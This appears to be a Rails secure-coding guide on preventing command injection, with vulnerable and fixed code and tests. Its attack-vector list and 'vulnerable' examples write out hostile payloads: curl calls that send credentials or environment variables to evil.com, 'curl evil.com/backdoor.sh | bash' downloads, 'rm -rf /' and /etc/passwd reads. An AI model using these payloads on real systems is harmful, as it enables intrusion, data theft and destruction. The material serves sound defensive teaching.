---
name: security-command-injection
domain: security
dependencies: []
version: 1.0
rails_version: 8.1+
criticality: CRITICAL
---

# Command Injection Prevention

Prevent command injection attacks by never interpolating user input into system commands. Use array arguments, input validation, and Ruby alternatives.

<when-to-use>
- Executing ANY system command with user input
- File processing (convert, resize, compress)
- PDF generation, document conversion
- Archive operations (tar, zip, unzip)
- Image manipulation with external tools
- Calling external binaries or scripts
- ALWAYS - Command injection prevention is ALWAYS required
</when-to-use>

<attack-vectors>
- **Command Chaining** - `; rm -rf /` or `&& cat /etc/passwd`
- **Pipe Attacks** - `| curl evil.com/steal?data=$(cat secrets.yml)`
- **Background Execution** - `& malicious_script.sh`
- **Command Substitution** - `$(curl evil.com/backdoor.sh | bash)`
- **File Path Traversal** - `../../../etc/passwd`
- **Data Exfiltration** - Export sensitive files or environment variables
</attack-vectors>

<standards>
- NEVER use string interpolation/concatenation in system commands
- ALWAYS use array form of system() with separate arguments
- PREFER Ruby methods over shell commands (File, FileUtils, etc.)
- VALIDATE input with strict allowlists when possible
- ESCAPE with Shellwords.escape only if array form impossible
- AVOID backticks, %x(), exec() with user input
- ISOLATE system commands in background jobs with validation
- Use ActiveStorage variants instead of ImageMagick commands
</standards>

## Vulnerable Patterns

<pattern name="string-interpolation-danger">
<description>NEVER interpolate user input into system commands</description>

**CRITICAL VULNERABILITIES:**
```ruby
# ❌ CRITICAL - Command injection via concatenation
system("echo #{params[:filename]}")
# Attack: params[:filename] = "hello; rm -rf /"
# Result: Echoes "hello" AND DELETES ALL FILES

# ❌ CRITICAL - Data exfiltration
system("convert #{params[:image]} output.jpg")
# Attack: params[:image] = "image.jpg; cat /etc/passwd > public/passwords.txt"
# Result: Exposes system passwords to public directory

# ❌ CRITICAL - Secret theft
system("/bin/tar -czf backup.tar.gz #{params[:directory]}")
# Attack: params[:directory] = "/app/data; curl evil.com?data=$(cat config/credentials.yml.enc)"
# Result: Sends encrypted credentials to attacker

# ❌ CRITICAL - Backdoor installation
system("unzip #{params[:archive]}")
# Attack: params[:archive] = "file.zip; curl evil.com/backdoor.sh | bash"
# Result: Downloads and executes malicious script

# ❌ CRITICAL - Using backticks
output = `ls #{params[:path]}`
# Attack: params[:path] = "/; cat /etc/passwd"
# Result: Directory listing AND password file exposure

# ❌ CRITICAL - Using %x()
result = %x(convert #{params[:input]} output.png)
# Attack: params[:input] = "file.jpg; wget evil.com/malware"
# Result: Downloads malware to server
```

**Why This Happens:**
User input is interpreted as shell commands, allowing attackers to execute arbitrary system commands with application privileges.
</pattern>

## Secure Patterns

<pattern name="array-arguments-recommended">
<description>Use array form of system() - RECOMMENDED approach</description>

**Safe Array Form:**
```ruby
# ✅ SECURE - Array arguments prevent shell interpretation
system("/bin/echo", params[:filename])
# Input: "hello; rm -rf /"
# Output: "hello; rm -rf /" (printed literally, NOT executed)

# ✅ SECURE - Image conversion
system("convert", params[:image], "output.jpg")
# params[:image] treated as filename argument only

# ✅ SECURE - Archive creation
system("/bin/tar", "-czf", "backup.tar.gz", validated_directory)
# Directory name is literal argument, not interpreted

# ✅ SECURE - Multiple arguments
system(
  "wkhtmltopdf",
  "--quiet",
  "--page-size", "A4",
  input_file,
  output_file
)
```

**How It Works:**
When passing arguments as array elements, Ruby executes the command directly without invoking a shell, preventing command injection.

**Controller Example:**
```ruby
# app/controllers/exports_controller.rb
class ExportsController < ApplicationController
  def pdf
    feedback = Feedback.find(params[:id])
    output_path = Rails.root.join("tmp", "feedback_#{feedback.id}.pdf")

    # ✅ SECURE - Array form prevents injection
    success = system(
      "wkhtmltopdf",
      "--quiet",
      feedback_url(feedback),
      output_path.to_s
    )

    if success
      send_file output_path, type: "application/pdf"
    else
      render plain: "PDF generation failed", status: :internal_server_error
    end
  end
end
```
</pattern>

<pattern name="input-validation-allowlist">
<description>Validate input with strict allowlists</description>

**Allowlist Validation:**
```ruby
# ✅ SECURE - Only allow predefined values
VALID_FORMATS = %w[pdf png jpg svg].freeze
VALID_SIZES = %w[small medium large].freeze

def export_feedback(feedback, format, size)
  unless VALID_FORMATS.include?(format)
    raise ArgumentError, "Invalid format: #{format}"
  end

  unless VALID_SIZES.include?(size)
    raise ArgumentError, "Invalid size: #{size}"
  end

  # Safe because format is from allowlist
  system("convert", "feedback.html", "output.#{format}")
end
```

**Integer Validation:**
```ruby
# ✅ SECURE - Validate input is integer
def export_feedback_pdf(feedback_id)
  # Integer() raises ArgumentError if not valid integer
  id = Integer(feedback_id)

  # Use array form of system
  system(
    "wkhtmltopdf",
    "http://localhost/feedbacks/#{id}",
    "tmp/feedback_#{id}.pdf"
  )
rescue ArgumentError
  raise "Invalid feedback ID"
end
```

**Regex Validation:**
```ruby
# ✅ SECURE - Strict path validation
def process_upload(filename)
  # Only allow alphanumeric, dash, underscore, and extension
  unless filename.match?(/\A[\w\-]+\.(jpg|png|gif)\z/)
    raise ArgumentError, "Invalid filename format"
  end

  system("convert", filename, "processed_#{filename}")
end
```

**Path Validation:**
```ruby
# ✅ SECURE - Prevent directory traversal
def safe_file_path(user_input)
  base_dir = Rails.root.join("uploads")
  full_path = base_dir.join(user_input).expand_path

  # Ensure path is within base directory
  unless full_path.to_s.start_with?(base_dir.to_s)
    raise ArgumentError, "Invalid path: directory traversal detected"
  end

  full_path
end
```
</pattern>

<pattern name="ruby-alternatives-preferred">
<description>Use Ruby methods instead of shell commands (PREFERRED)</description>

**File Operations:**
```ruby
# ❌ VULNERABLE - Shell command
system("rm #{params[:filename]}")

# ✅ SECURE - Ruby method
File.delete(params[:filename]) if File.exist?(params[:filename])

# ❌ VULNERABLE - Shell command
system("mkdir -p #{params[:directory]}")

# ✅ SECURE - Ruby method
FileUtils.mkdir_p(params[:directory])

# ❌ VULNERABLE - Shell command
system("cp #{params[:source]} #{params[:dest]}")

# ✅ SECURE - Ruby method
FileUtils.cp(params[:source], params[:dest])

# ❌ VULNERABLE - Shell command
system("mv #{params[:old]} #{params[:new]}")

# ✅ SECURE - Ruby method
FileUtils.mv(params[:old], params[:new])
```

**Archive Operations:**
```ruby
# ❌ VULNERABLE - Shell tar command
system("tar -czf archive.tar.gz #{params[:directory]}")

# ✅ SECURE - Use minitar gem
require "minitar"

def create_archive(directory, output_file)
  Minitar.pack(directory, File.open(output_file, "wb"))
end
```

**Why Prefer Ruby:**
- No shell interpretation = no injection risk
- Better error handling
- Cross-platform compatibility
- Cleaner code
</pattern>

<pattern name="shellwords-escaping">
<description>Use Shellwords.escape when array form not possible</description>

**Shellwords Escaping:**
```ruby
require "shellwords"

# ✅ SECURE - Escape user input for shell safety
filename = Shellwords.escape(params[:filename])
system("convert input.jpg #{filename}")
# Shellwords.escape quotes and escapes special characters

# ✅ SECURE - Multiple arguments
args = [params[:input], params[:output]]
  .map { |arg| Shellwords.escape(arg) }
  .join(" ")
system("convert #{args} -resize 800x600")
```

**How Shellwords Works:**
```ruby
# Examples of escaping
Shellwords.escape("file.jpg")
# => "file.jpg"

Shellwords.escape("file with spaces.jpg")
# => "file\\ with\\ spaces.jpg"

Shellwords.escape("file; rm -rf /")
# => "file\\;\\ rm\\ -rf\\ /"

Shellwords.escape("$(cat /etc/passwd)")
# => "\\$\\(cat\\ /etc/passwd\\)"
```

**When to Use:**
- Only when array form is truly not possible
- Prefer array form whenever available
- Still validate input before escaping
</pattern>

<pattern name="activestorage-variants">
<description>Use ActiveStorage variants instead of system commands</description>

**ActiveStorage Model:**
```ruby
# app/models/feedback.rb
class Feedback < ApplicationRecord
  has_one_attached :image

  # ✅ SECURE - No system commands, no injection risk
  def thumbnail
    image.variant(resize_to_limit: [100, 100])
  end

  def medium
    image.variant(resize_to_limit: [800, 600])
  end

  def large
    image.variant(resize_to_limit: [1920, 1080])
  end

  # Complex transformations
  def processed_image
    image.variant(
      resize_to_fill: [800, 600],
      format: :jpg,
      saver: { quality: 80 }
    )
  end
end
```

**View:**
```erb
<%# Display variants safely %>
<%= image_tag feedback.thumbnail %>
<%= image_tag feedback.medium %>
<%= image_tag feedback.processed_image %>
```

**Controller:**
```ruby
# app/controllers/feedbacks_controller.rb
class FeedbacksController < ApplicationController
  def create
    @feedback = Feedback.new(feedback_params)

    if @feedback.save
      # ActiveStorage handles processing safely
      redirect_to @feedback, notice: "Feedback created with image"
    else
      render :new, status: :unprocessable_entity
    end
  end

  private

  def feedback_params
    params.require(:feedback).permit(:title, :content, :image)
  end
end
```

**Benefits:**
- No shell commands = no injection vectors
- Automatic processing pipeline
- Built-in format conversion
- Cloud storage support
- Secure by design
</pattern>

<pattern name="background-job-isolation">
<description>Isolate system commands in background jobs with strict validation</description>

**Background Job:**
```ruby
# app/jobs/pdf_generation_job.rb
class PdfGenerationJob < ApplicationJob
  queue_as :default

  def perform(feedback_id, output_path)
    feedback = Feedback.find(feedback_id)

    # ✅ Validate all inputs strictly
    validate_output_path!(output_path)

    # ✅ Use array form
    success = system(
      "wkhtmltopdf",
      "--quiet",
      "--page-size", "A4",
      "--disable-javascript",  # Security: disable JS execution
      feedback.public_url,
      output_path
    )

    raise "PDF generation failed" unless success

    # Notify user
    PdfMailer.with(feedback: feedback, pdf_path: output_path).ready.deliver_later
  end

  private

  def validate_output_path!(path)
    # Only allow specific directory and format
    unless path.match?(/\Atmp\/feedback_\d+\.pdf\z/)
      raise ArgumentError, "Invalid output path: #{path}"
    end

    # Prevent directory traversal
    full_path = Rails.root.join(path).expand_path
    allowed_dir = Rails.root.join("tmp").expand_path

    unless full_path.to_s.start_with?(allowed_dir.to_s)
      raise ArgumentError, "Path outside allowed directory"
    end
  end
end
```

**Controller:**
```ruby
# app/controllers/exports_controller.rb
class ExportsController < ApplicationController
  def generate_pdf
    feedback = Feedback.find(params[:id])
    output_path = "tmp/feedback_#{feedback.id}.pdf"

    # ✅ SECURE - Isolated in background job
    PdfGenerationJob.perform_later(feedback.id, output_path)

    redirect_to feedback, notice: "PDF generation started"
  end
end
```
</pattern>

<antipatterns>
<antipattern>
<description>Using backticks for command execution</description>
<reason>CRITICAL - Allows command injection through shell interpretation</reason>
<bad-example>
```ruby
# ❌ CRITICAL VULNERABILITY
def list_directory
  path = params[:path]
  output = `ls #{path}`
  # Attack: params[:path] = "/; cat /etc/passwd"
  # Result: Directory listing AND password file exposure
end

# ❌ CRITICAL VULNERABILITY
result = `convert #{params[:image]} output.jpg`
# Attack: params[:image] = "file.jpg; curl evil.com/steal?data=$(env)"
# Result: Sends all environment variables to attacker
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Use array form and capture output
def list_directory
  path = params[:path]
  validate_path!(path)

  output, status = Open3.capture2("ls", path)
  # User input treated as literal argument only
end

# ✅ SECURE - Use array form
system("convert", validated_image, "output.jpg")
```
</good-example>
</antipattern>

<antipattern>
<description>Using eval() with user input</description>
<reason>CRITICAL - Allows arbitrary Ruby code execution</reason>
<bad-example>
```ruby
# ❌ CRITICAL VULNERABILITY - NEVER do this
def calculate
  result = eval(params[:expression])
  # Attack: params[:expression] = "system('rm -rf /')"
  # Result: Deletes all files
end
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Use safe parser for expressions
require "dentaku"

def calculate
  calculator = Dentaku::Calculator.new
  result = calculator.evaluate(params[:expression])
  # Only allows mathematical expressions, not code execution
rescue Dentaku::ParseError
  render plain: "Invalid expression", status: :bad_request
end
```
</good-example>
</antipattern>

<antipattern>
<description>Using open() with pipe for command execution</description>
<reason>CRITICAL - Pipe character enables command execution</reason>
<bad-example>
```ruby
# ❌ CRITICAL VULNERABILITY
def process_data
  IO.foreach("|sort #{params[:file]}") do |line|
    # Process sorted lines
  end
  # Attack: params[:file] = "data.txt; rm -rf /"
end
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Read file then sort in Ruby
def process_data
  validate_filename!(params[:file])

  File.foreach(params[:file]) do |line|
    # Process line
  end.sort
end

# ✅ SECURE - Use Open3 for explicit command execution
require "open3"

def process_data
  validated_file = validate_filename!(params[:file])

  Open3.popen3("sort", validated_file) do |stdin, stdout, stderr, wait_thr|
    stdout.each_line do |line|
      # Process sorted lines
    end
  end
end
```
</good-example>
</antipattern>

<antipattern>
<description>Building commands with string interpolation</description>
<reason>CRITICAL - Shell interprets special characters in user input</reason>
<bad-example>
```ruby
# ❌ CRITICAL VULNERABILITY
def resize_image
  system("convert #{params[:input]} -resize #{params[:size]} output.jpg")
  # Attack: params[:size] = "800x600; curl evil.com/backdoor.sh | bash"
  # Result: Downloads and executes malicious script
end
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Use array form with validation
def resize_image
  input_file = validate_image_file!(params[:input])
  size = validate_size!(params[:size])

  system("convert", input_file, "-resize", size, "output.jpg")
end

private

def validate_size!(size)
  # Only allow WIDTHxHEIGHT format
  unless size.match?(/\A\d{1,4}x\d{1,4}\z/)
    raise ArgumentError, "Invalid size format"
  end
  size
end

def validate_image_file!(filename)
  # Allowlist extensions
  unless filename.match?(/\A[\w\-]+\.(jpg|png|gif)\z/)
    raise ArgumentError, "Invalid image filename"
  end
  filename
end
```
</good-example>
</antipattern>

<antipattern>
<description>Not validating file paths for directory traversal</description>
<reason>HIGH - Allows access to files outside intended directory</reason>
<bad-example>
```ruby
# ❌ VULNERABLE - Directory traversal
def download_file
  # Attack: params[:file] = "../../../etc/passwd"
  file_path = Rails.root.join("uploads", params[:file])
  send_file file_path
end
```
</bad-example>
<good-example>
```ruby
# ✅ SECURE - Validate path stays within directory
def download_file
  base_dir = Rails.root.join("uploads")
  file_path = base_dir.join(params[:file]).expand_path

  # Check path is within uploads directory
  unless file_path.to_s.start_with?(base_dir.to_s)
    raise ArgumentError, "Invalid file path"
  end

  # Check file exists
  unless File.exist?(file_path)
    raise ActiveRecord::RecordNotFound
  end

  send_file file_path
end
```
</good-example>
</antipattern>
</antipatterns>

<testing>
Test command injection prevention:

```ruby
# test/jobs/pdf_generation_job_test.rb
class PdfGenerationJobTest < ActiveJob::TestCase
  test "validates output path format" do
    feedback = feedbacks(:one)

    assert_raises(ArgumentError, /Invalid output path/) do
      PdfGenerationJob.perform_now(feedback.id, "invalid_path.pdf")
    end
  end

  test "prevents directory traversal in path" do
    feedback = feedbacks(:one)

    assert_raises(ArgumentError, /Invalid output path|outside allowed directory/i) do
      PdfGenerationJob.perform_now(feedback.id, "../../../etc/passwd")
    end
  end

  test "rejects command injection in path" do
    feedback = feedbacks(:one)

    assert_raises(ArgumentError, /Invalid output path/) do
      PdfGenerationJob.perform_now(feedback.id, "output.pdf; rm -rf /")
    end
  end

  test "generates PDF with safe path" do
    feedback = feedbacks(:one)
    path = "tmp/feedback_#{feedback.id}.pdf"

    # Clean up any existing file
    File.delete(path) if File.exist?(path)

    PdfGenerationJob.perform_now(feedback.id, path)

    assert File.exist?(path), "PDF file should be created"
  end
end

# test/controllers/exports_controller_test.rb
class ExportsControllerTest < ActionDispatch::IntegrationTest
  test "rejects invalid format parameter" do
    feedback = feedbacks(:one)

    # Attempt command injection via format
    assert_raises(ArgumentError) do
      get export_feedback_path(feedback, format: "pdf; rm -rf /")
    end
  end

  test "validates file path parameter" do
    # Attempt directory traversal
    assert_raises(ArgumentError) do
      get download_path(file: "../../../etc/passwd")
    end
  end
end

# test/models/feedback_test.rb
class FeedbackTest < ActiveSupport::TestCase
  test "image variants are processed safely" do
    feedback = feedbacks(:one)
    feedback.image.attach(
      io: File.open(Rails.root.join("test", "fixtures", "files", "test.jpg")),
      filename: "test.jpg",
      content_type: "image/jpeg"
    )

    # ActiveStorage variants should work without shell injection risk
    assert feedback.thumbnail.present?
    assert feedback.medium.present?
  end
end

# test/system/file_upload_test.rb
class FileUploadTest < ApplicationSystemTestCase
  test "safely handles malicious filename" do
    visit new_feedback_path

    # Attempt to upload file with malicious name
    malicious_filename = "test; rm -rf /.jpg"

    attach_file "feedback[image]", Rails.root.join("test/fixtures/files/test.jpg")

    # System should sanitize filename
    click_button "Create Feedback"

    assert_text "Feedback created"
    # No files should be deleted from injection attempt
  end
end
```
</testing>

<related-skills>
- security-xss - Output escaping
- security-sql-injection - SQL injection prevention
- file-uploads - Safe file handling
- activestorage - Image processing without shell
- background-jobs - Isolating risky operations
</related-skills>

<resources>
- [Rails Security Guide - Command Line Injection](https://guides.rubyonrails.org/security.html#command-line-injection)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Ruby Shellwords Documentation](https://ruby-doc.org/stdlib-3.0.0/libdoc/shellwords/rdoc/Shellwords.html)
- [ActiveStorage Guide](https://guides.rubyonrails.org/active_storage_overview.html)
</resources>
